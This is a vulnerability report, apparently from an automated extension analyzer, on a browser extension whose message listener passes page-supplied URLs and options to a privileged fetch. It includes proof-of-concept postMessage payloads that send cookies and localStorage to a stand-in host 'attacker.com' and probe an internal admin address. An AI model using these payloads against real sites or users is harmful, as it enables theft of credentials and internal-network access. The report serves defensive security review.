# CoCo Analysis: gopdpgphdcjglgoojmfdpbcdfcmnllkc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (fetch_resource_sink, fetch_options_sink)

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gopdpgphdcjglgoojmfdpbcdfcmnllkc/opgen_generated_files/cs_0.js
Line 475	function eventListener(event) {
Line 476	  if (event.data.fromBookReport && event.data.direction === 'from page') {
Line 477	    chrome.runtime.sendMessage(event.data.message, a =>

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gopdpgphdcjglgoojmfdpbcdfcmnllkc/opgen_generated_files/bg.js
Line 1065	      fetch(request.url, request.options).then(response => {
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 473-481)
window.addEventListener('message', eventListener);

function eventListener(event) {
  if (event.data.fromBookReport && event.data.direction === 'from page') {
    chrome.runtime.sendMessage(event.data.message, a => // ← attacker-controlled
      messageCallback(a, event)
    );
  }
}

// Background script - Message handler (bg.js Line 1039-1042, 1059-1115)
ext.runtime.onMessage.addListener((request, sender, callback) => {
  handleMessage(request, callback, ext);
  return true;
});

function handleMessage(request, callback, extAPI) {
  switch (request.type) {
    case 'version':
      callback(version);
      break;
    case 'fetch':
      fetch(request.url, request.options).then(response => { // ← attacker-controlled URL and options
        const responseToUseForBlob = request.requiresBase64 ? response.clone() : null;
        return response.text().then(body => {
          if (!request.requiresBase64) {
            return { body, response };
          }
          return responseToUseForBlob.blob().then(blob => {
            return new Promise(resolve => {
              const reader = new FileReader();
              reader.readAsDataURL(blob);
              reader.onloadend = () => {
                const base64data = reader.result.split(',')[1];
                resolve({ body, base64: base64data, response });
              };
            });
          });
        });
      }).then(({ body, base64, response }) => {
        const returnValue = {
          headers: [...response.headers],
          body: body
        };
        if (base64) {
          returnValue.base64 = base64;
        }
        fetchResAtts.forEach(att => {
          returnValue[att] = response[att];
        });
        callback(returnValue);
      });
      break;
    // ... other cases
  }
  return true;
}
```

**Manifest.json:**
```json
"content_scripts": [
  {
    "matches": [
      "*://*.getbookreport.com/*"
    ],
    "js": [
      "listener.js"
    ]
  }
],
"permissions": [
  "cookies",
  "declarativeNetRequest",
  "declarativeNetRequestWithHostAccess"
]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// Malicious code on getbookreport.com page (or any page where content script runs)
window.postMessage({
  fromBookReport: true,
  direction: 'from page',
  message: {
    type: 'fetch',
    url: 'http://attacker.com/exfiltrate',
    options: {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage)
      })
    }
  }
}, '*');

// Or SSRF attack to internal network
window.postMessage({
  fromBookReport: true,
  direction: 'from page',
  message: {
    type: 'fetch',
    url: 'http://192.168.1.1/admin',
    options: {
      method: 'GET'
    }
  }
}, '*');
```

**Impact:** The attacker can perform privileged cross-origin fetch requests from the extension's context to arbitrary URLs they control (SSRF). The extension acts as a proxy, making requests to attacker-controlled URLs with the extension's elevated privileges, bypassing CORS restrictions. The response (body, headers, status) is sent back to the attacker via the messageCallback and window.postMessage. While the content script is restricted to getbookreport.com in the manifest, according to the analysis methodology we ignore manifest.json content_scripts matches restrictions. If a window.addEventListener('message') exists in the content script, we assume any attacker can exploit it.

---

## Sink 2: cs_window_eventListener_message → fetch_options_sink

This is the same flow as Sink 1, where both `request.url` and `request.options` are attacker-controlled and passed to the fetch() API. The attacker controls both the destination URL and the fetch options (method, headers, body, etc.), enabling full SSRF capabilities.
